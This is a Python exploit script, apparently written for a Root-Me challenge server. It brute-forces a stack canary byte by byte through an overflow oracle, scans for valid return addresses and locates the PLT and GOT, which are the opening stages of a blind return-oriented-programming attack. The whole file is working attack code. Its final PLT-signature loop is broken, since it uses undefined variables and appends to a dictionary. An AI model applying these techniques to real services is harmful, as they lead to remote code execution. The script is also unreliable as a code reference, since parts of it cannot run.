import re
import time
import struct
import socket
import binascii

from request import *


HOST = 'challenge03.root-me.org'
PORT = 56543
LEN = 1024

def log(C, x, input):
    print(x)
    print("Obtained for input = "+binascii.hexlify(input[32:]))

def test_cookie(C):
    global cookie
    global prefix_final
    tmp = Request().send_receive(prefix_final+cookie[:4])
    return index_correspondance(tmp>>2)>0

Request.new_request_callback = log
Request.test_cookie_callback = test_cookie

meta = {}
correspondances = {}
def index_correspondance(index):
    if correspondances.get(index) is not None:
        return correspondances[index]
    else:
        m = Request.get_answer(index)
        exited = m.count('Bye!')
        if exited == 0:
            correspondances[index] = 0
        else:
            correspondances[index] = 0
            for i in m:
                if re.search('Enter your choice',i) is not None:
                    correspondances[index] += 1
            l = len(m)
            if meta.get(correspondances[index]) is None:
                meta[correspondances[index]] = l
            if l != meta[correspondances[index]]:
                print("Warning : length of result is not the same as in meta :")
                print(str(l)+" whereas commonly for "+str(correspondances[index])+" it's "+str(meta[correspondances[index]]))
        return correspondances[index]


#1] Find length
print("[+] Finding vulnerable length")

# garbage_len = -1
# for i in range(1,60):
#     tmp = Request().send_receive('A'*i)
#     index = tmp>>2
#     if index_correspondance(index) == 0 and garbage_len<0:
#         garbage_len = i-1
garbage_len = 32
prefix = '@'*garbage_len
prefix_final = '@'*garbage_len

print("[.] Length found : "+str(garbage_len))


print("[+] Finding cookie and leak")

def leak_from_position(begin, end, prefix = '', stop_at_first_found = False):
    leaked = {}
    leaked_time = {}
    cookie = ''
    if prefix == '':
        prefix = 'A'*begin
    for j in range(begin, end):
        found = False
        leaked[j] = []
        leaked_time[j] = []
        i = 0
        while (not found or not stop_at_first_found) and i<256:
            req = Request()
            tmp = req.send_receive(prefix+cookie+chr(i))
            index = tmp>>2
            exited = (tmp>>1)&1

            if index_correspondance(index) == 1:
                found = True
                leaked[j].append(chr(i))
            if exited == 0:
                leaked_time[j].append(chr(i))

            if not found or not stop_at_first_found:
                i += 1
                time.sleep(0.1)

        if len(leaked[j]) == 0:
            print("[!] Ouch no dump has been made ...")
            cookie += '?'
        else:
            print("[.] Found part of cookie with "+str(len(leaked[j]))+" choices and "+str(len(leaked_time[j]))+" time leaked")
            if len(leaked[j])<10:
                print(j)
                print(leaked[j])
                print(leaked_time[j])
            if not stop_at_first_found:
                if leaked[j][0] == '\x00' and len(leaked[j])>1:
                    if leaked[j][1] == '\n' and len(leaked[j])>2:
                        cookie += leaked[j][2]
                    elif leaked[j][1] == '\n':
                        cookie += '\x00'
                    else:
                        cookie += leaked[j][1]
                elif leaked[j][0] == '\n' and len(leaked[j])>1:
                    cookie += leaked[j][1]
                else:
                    cookie += leaked[j][0]
            else:
                cookie += chr(i)

        print("cur cookie = "+cookie)
        print(binascii.hexlify(cookie))

    return cookie, leaked, leaked_time

#prefix += binascii.unhexlify('0008e49401010301643f70e318ad48f4851e70e3')
# cookie = ''
# prefix += binascii.unhexlify('00')
# prefix_final += binascii.unhexlify('00')
# cookie, leaked, leaked_time = leak_from_position(len(prefix),garbage_len+20,prefix)
# for a in leaked:
#     if len(leaked[a])<10:
#         print(a)
#         print(leaked[a])
# for a in leaked_time:
#    if len(leaked_time[a])<10:
#        print(a)
#        print(leaked_time[a])

#prev : 00fe37930101010264efc1ec1806a6fc85cec1ec
#prev : 00ee04e801010101648f99de4c2008f78d6e99de
#prev : 0008e49401010301643f70e318ad48f4851e70e3
prefix = '@'*garbage_len
prefix_final = '@'*garbage_len
cookie = binascii.unhexlify('000AE4090101010164AF69F00CD834FD8D8E69F0')
cookie_hex = binascii.hexlify(cookie)
cookie = binascii.unhexlify(cookie_hex)
print("[.] Cookie leaked : "+cookie_hex)

from program_leaking import *

# print("[+] Leaking stack")
# p = Program_leaking(prefix+binascii.unhexlify('0096ae8d01010101'),binascii.unhexlify('183742f1851e66db'),binascii.unhexlify('643f66db'),True)
# p.leak(-0xc00,0x100)

# print("[+] Leaking program")
# p = Program_leaking(prefix+binascii.unhexlify('0096ae8d01010101'),binascii.unhexlify('183742f1851e66db'),binascii.unhexlify('183742f1'),True)
# p.leak(-0x1f,0x8000)

# code_addr = cookie[-4:]
# print(binascii.hexlify(code_addr))
# code_addr_int = struct.unpack('I',code_addr)[0]
#
# returnable_addr = []
# for i in range(-0x2000,0x2000,2):
#     addr = struct.pack('I',code_addr_int+i)
#     req = Request()
#     input = prefix+cookie+addr
#     tmp = req.send_receive(input)
#     index1 = tmp>>2
#     exited1 = (tmp>>1)&1
#     if index1 != 0:
#         print(i)
#         print(binascii.hexlify(addr))
#         print(index_correspondance(index1),exited1)

print("[+] Finding all possible return addresses")

code_addr = cookie[-8:-4]
print(binascii.hexlify(code_addr))
code_addr_int = struct.unpack('I',code_addr)[0]

returnable_addr = []
for i in range(-0x100,0x1400,2):
    addr = struct.pack('I',code_addr_int+i)
    req = Request()
    tmp = req.send_receive(prefix+cookie[:-8]+addr+cookie[-4:])
    index1 = tmp>>2
    exited1 = (tmp>>1)&1
    if i==108:
        leak_from_position(len(prefix+cookie[:-8]+addr+cookie[-4:]),len(prefix+cookie[:-8]+addr+cookie[-4:])+20,prefix+cookie[:-8]+addr+cookie[-4:])
    if index_correspondance(index1) > 0:
        returnable_addr.append(code_addr_int+i)
        req = Request()
        tmp = req.send_receive(prefix+cookie[:-8]+addr+cookie[-4:]+addr[::-1])
        index2 = tmp>>2
        exited2 = (tmp>>1)&1
        req = Request()
        tmp = req.send_receive(prefix+cookie[:-8]+addr+cookie[-4:]+cookie[-12:-8]*3)
        index3 = tmp>>2
        exited3 = (tmp>>1)&1
        print(i)
        print(binascii.hexlify(addr[::-1]))
        print(index_correspondance(index1),exited1,index_correspondance(index2),exited2,index_correspondance(index3),exited3)

print("[+] Finding PLT and GOT")

i = 0
PLT = []
PLT_begin = False
PLT_found = False
while i<len(returnable_addr) and not PLT_found:
    if returnable_addr[i]+4 in returnable_addr and ((returnable_addr[i]+16 in returnable_addr and returnable_addr[i]+32 in returnable_addr) or PLT_begin):
        PLT_begin = True
        PLT.append(returnable_addr[i])
        if not returnable_addr[i]+16 in returnable_addr:
            PLT_found = True
    i += 1

if PLT_found:
    print("[.] PLT has been found at : "+hex(PLT[0]))
else:
    print("[!] PLT has not been found, exiting")
    exit()


GOT = []
GOT_begin = False
GOT_found = False
while i<len(returnable_addr) and not GOT_found:
    if ((returnable_addr[i]+16 in returnable_addr and returnable_addr[i]+32 in returnable_addr) or GOT_begin):
        GOT_begin = True
        GOT.append(returnable_addr[i])
        if not returnable_addr[i]+16 in returnable_addr:
            GOT_found = True
    i += 1

if GOT_found:
    print("[.] GOT has been found at : "+hex(GOT[0]))
else:
    print("[!] GOT has not been found, exiting")
    exit()


print("[+] Testing PLT signatures")
# exemple : addr -> exit
#           0000 -> exit
#           addr addr -> ok
#           addr 0000 -> exit
#           0000 addr -> exit
#           0000 0000 -> exit    -> fin
#           addr addr 0000 -> ok
#           addr addr addr -> ok -> fin

possibilities = ["\x00\x00\x00\x04",cookie[-4:],PLT[0]]
labels = ['small','addr on addr','addr on readable']
signatures = {}
for addr in PLT:
    signatures[hex(addr)] = {}
    tmp_correspondances = {-1:('',True)}
    search = True
    while search:
        search = False
        tmp_correspondances_bis = {}
        tmp_correspondances_ter = {}
        for k in tmp_correspondances:
            cur = tmp_correspondances[k]
            if cur[1]:
                different = False
                for i in range(len(possibilities)):
                    addr_str = struct.pack('I',code_addr_int+i)
                    req = Request()
                    tmp = req.send_receive(prefix+cookie[:-8]+addr_str[::-1]+cur[0]+possibilities[i])
                    index = tmp>>2
                    crash = tmp&1
                    j = index_correspondance(index)*2+crash
                    if prev<0:
                        prev = j
                    if j != prev:
                        different = True
                        search = True
                    if tmp_correspondances_bis.get(j) is not None:
                        tmp_signatures[j].append(labels[i])
                        tmp_correspondances_bis[j].append(cur[0]+possibilities[i])
                    else:
                        tmp_signatures[j] = [labels[i]]
                        tmp_correspondances_bis[j] = [cur[0]+possibilities[i]]

                for j in tmp_signatures:
                    if signatures[hex(addr)].get(j) is None:
                        signatures[hex(addr)][j] = []
                    signatures[hex(addr)][j].extend(tmp_signatures[j])
                    for k in tmp_correspondances_bis[j]:
                        tmp_correspondances_ter.append((k,different))

        tmp_correspondances = tmp_correspondances_ter

print("[+] PLT signatures obtained :")
print(signatures)
